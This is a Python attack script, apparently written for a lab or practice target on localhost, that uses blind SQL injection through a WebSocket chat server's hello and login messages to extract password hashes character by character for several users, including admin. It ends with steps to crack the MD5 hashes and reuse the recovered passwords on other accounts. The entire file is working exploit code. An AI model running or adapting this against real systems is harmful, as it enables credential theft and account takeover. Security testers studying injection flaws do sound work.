#!/usr/bin/env python3
"""
EXTRACT ALL USER HASHES
Extract password hashes for all discovered users, focusing on the test users
that were created with weak passwords from the wordlist.
"""

import asyncio
import websockets
import json
import time
import string

class MultiUserHashExtractor:
    def __init__(self, server_url: str = "ws://127.0.0.1:8765"):
        self.server_url = server_url
        
    async def test_blind_condition(self, condition: str) -> bool:
        """Test a SQL condition and return True if it's true, False if false."""
        payload = f"admin' OR ({condition}) AND (SELECT COUNT(*) FROM users) > 0 --"
        
        try:
            async with websockets.connect(self.server_url) as websocket:
                hello_msg = {
                    "type": "USER_HELLO",
                    "from": payload,
                    "to": "",
                    "ts": int(time.time() * 1000),
                    "payload": {"client": "multi-user-extract"}
                }
                await websocket.send(json.dumps(hello_msg))
                
                login_msg = {
                    "type": "USER_LOGIN",
                    "ts": int(time.time() * 1000),
                    "payload": {
                        "user_id": payload,
                        "password": "test"
                    }
                }
                await websocket.send(json.dumps(login_msg))
                
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=3.0)
                    response = await asyncio.wait_for(websocket.recv(), timeout=3.0)  # Get login response
                    response_data = json.loads(response)
                    
                    if response_data.get('payload', {}).get('code') == 'BAD_KEY':
                        return True
                    else:
                        return False
                        
                except asyncio.TimeoutError:
                    return False
                    
        except Exception as e:
            return False

    async def extract_password_length(self, username: str) -> int:
        """Extract the length of a user's password hash."""
        for length in range(1, 100):
            condition = f"(SELECT LENGTH(pake_password) FROM users WHERE user_id='{username}') = {length}"
            if await self.test_blind_condition(condition):
                return length
        return 0
        
    async def extract_password_char(self, username: str, position: int) -> str:
        """Extract a single character from the password hash at given position."""
        for char in string.printable:
            if char in ["'", '"', "\\", "%"]:  # Skip problematic characters
                continue
                
            condition = f"(SELECT SUBSTR(pake_password, {position}, 1) FROM users WHERE user_id='{username}') = '{char}'"
            if await self.test_blind_condition(condition):
                return char
                
        return "?"
        
    async def extract_full_password_hash(self, username: str):
        """Extract the complete password hash for a user."""
        print(f"\n🎯 EXTRACTING PASSWORD HASH FOR: {username}")
        print("-" * 50)
        
        # First get the length
        hash_length = await self.extract_password_length(username)
        if hash_length == 0:
            print(f"❌ Could not determine hash length for {username}")
            return None
            
        print(f"✅ Password hash length: {hash_length}")
        
        # Extract each character
        password_hash = ""
        for pos in range(1, min(hash_length + 1, 50)):  # Limit to first 50 chars
            char = await self.extract_password_char(username, pos)
            password_hash += char
            
            # Show progress every 5 characters
            if pos % 5 == 0:
                print(f"Progress: {pos}/{hash_length} → {password_hash}")
            
            await asyncio.sleep(0.05)  # Smaller delay for faster extraction
            
        print(f"✅ EXTRACTED HASH: {password_hash}")
        return password_hash

async def main():
    print("🎯 MULTI-USER PASSWORD HASH EXTRACTION")
    print("Extracting hashes for all discovered users")
    print("=" * 70)
    
    extractor = MultiUserHashExtractor()
    
    # Focus on the test users you created with weak passwords
    target_users = [
        "testuser1",  # password: "password" 
        "testuser2",  # password: "admin"
        "testuser3",  # password: "123456"
        "testuser4",  # password: "alice"
        "testuser5",  # password: "qwerty"
        "admin",      # unknown password
        "alice"       # unknown password
    ]
    
    extracted_hashes = {}
    
    for username in target_users:
        try:
            hash_result = await extractor.extract_full_password_hash(username)
            if hash_result:
                extracted_hashes[username] = hash_result
                print(f"✅ Success: {username} → {hash_result}")
            else:
                print(f"❌ Failed: {username}")
        except Exception as e:
            print(f"❌ Error extracting {username}: {e}")
    
    print(f"\n📊 EXTRACTION SUMMARY:")
    print("=" * 50)
    print(f"Successfully extracted {len(extracted_hashes)} password hashes:")
    
    for username, hash_val in extracted_hashes.items():
        print(f"  {username}: {hash_val}")
    
    print(f"\n💡 NEXT STEPS:")
    print("1. Use these hashes with the MD5 cracking script")
    print("2. Focus on testuser1-5 as they have weak passwords")
    print("3. Once cracked, try those passwords on admin/alice accounts")

if __name__ == "__main__":
    asyncio.run(main())